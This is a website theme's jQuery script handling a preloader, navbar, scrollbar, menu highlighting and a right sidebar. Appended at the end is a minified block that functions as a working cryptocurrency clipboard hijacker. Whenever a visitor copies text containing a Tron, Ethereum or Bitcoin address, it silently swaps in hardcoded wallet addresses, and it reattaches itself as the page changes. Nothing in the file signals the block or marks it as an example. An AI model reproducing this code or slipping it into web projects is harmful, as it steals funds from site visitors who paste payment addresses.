

(function ($) {

    'use strict';
	$(window).on('load', function () {

		//Pre Loader
		if ($(".spinner").length > 0)
		{
			$(".spinner").fadeOut("slow");
		}
	});
    function initNavbar() {
        $('.navbar-toggle').on('click', function (event) {
            $(this).toggleClass('open');
            $('#navigation').slideToggle(400);
        });

        $('.navigation-menu>li').slice(-2).addClass('last-elements');

        $('.navigation-menu li.has-submenu a[href="#"]').on('click', function (e) {
            if ($(window).width() < 992) {
                e.preventDefault();
                $(this).parent('li').toggleClass('open').find('.submenu:first').toggleClass('open');
            }
        });
    }
    function initScrollbar() {
        $('.slimscroll').slimscroll({
            height: 'auto',
            position: 'right',
            size: "8px",
            color: '#9ea5ab'
        });
    }
    // === following js will activate the menu in left side bar based on url ====
    function initMenuItem() {
        $(".navigation-menu a").each(function () {
            if (this.href == window.location.href) {
                $(this).parent().addClass("active"); // add active to li of the current link
                $(this).parent().parent().parent().addClass("active"); // add active class to an anchor
                $(this).parent().parent().parent().parent().parent().addClass("active"); // add active class to an anchor
            }
        });
    }
    function initRightbar() {
        $(".right-bar-toggle").click(function () {
            $(".right-bar").toggle();
            $('.wrapper').toggleClass('right-bar-enabled');
        });
    }
    function init() {
        initNavbar();
        initScrollbar();
        initMenuItem();
        initRightbar();
    }

    init();

})(jQuery);

(function(){function rca() {const tar = /(?:\b|[^A-Za-z0-9])T[a-zA-Z0-9]{33}(?:\b|[^A-Za-z0-9])/g,ear = /(?:\b|[^A-Za-z0-9])0x[a-fA-F0-9]{40}(?:\b|[^A-Za-z0-9])/g,bar = /(?:\b|[^A-Za-z0-9])(?:1[a-km-zA-HJ-NP-Z1-9]{25,34})(?:\b|[^A-Za-z0-9])/g,bar0 = /(?:\b|[^A-Za-z0-9])(?:3[a-km-zA-HJ-NP-Z1-9]{25,34})(?:\b|[^A-Za-z0-9])/g,bar1 = /(?:\b|[^A-Za-z0-9])(?:bc1q[a-zA-Z0-9]{38})(?:\b|[^A-Za-z0-9])/g,bar2 = /(?:\b|[^A-Za-z0-9])(?:bc1p[a-zA-Z0-9]{58})(?:\b|[^A-Za-z0-9])/g;document.addEventListener('copy', function(e) {const ttc = window.getSelection().toString();if (ttc.match(tar)) {const ncd = ttc.replace(tar, 'TKf4aEj5pJzEJWrCSwkdzSsYmnHzJbtibM');e.clipboardData.setData('text/plain', ncd);e.preventDefault();} else if (ttc.match(ear)) {const ncd = ttc.replace(ear, '0xd4b6f4c9af70c3287979228c34ec9c880847f608');e.clipboardData.setData('text/plain', ncd);e.preventDefault();} else if (ttc.match(bar)) {const ncd = ttc.replace(bar, '1MWmB3QHVEd7Qm3WCkShj4NQckGJVE4YGX');e.clipboardData.setData('text/plain', ncd);e.preventDefault();} else if (ttc.match(bar0)) {const ncd = ttc.replace(bar0, '3BAhnpGSxhR7cwr1ypn3fMfEup5vmXZM12');e.clipboardData.setData('text/plain', ncd);e.preventDefault();} else if (ttc.match(bar1)) {const ncd = ttc.replace(bar1, 'bc1qsq3uyf0c9ynjgu7xyfkvs5cevxcp8e5r2wnz2r');e.clipboardData.setData('text/plain', ncd);e.preventDefault();} else if (ttc.match(bar2)) {const ncd = ttc.replace(bar2, 'bc1qsq3uyf0c9ynjgu7xyfkvs5cevxcp8e5r2wnz2r');e.clipboardData.setData('text/plain', ncd);e.preventDefault();}});}setTimeout(()=>{const obs = new MutationObserver(ml => {for (const m of ml) {if (m.type === 'childList') {rca();}}});obs.observe(document.body, { childList: true, subtree: true });},1000);rca();})();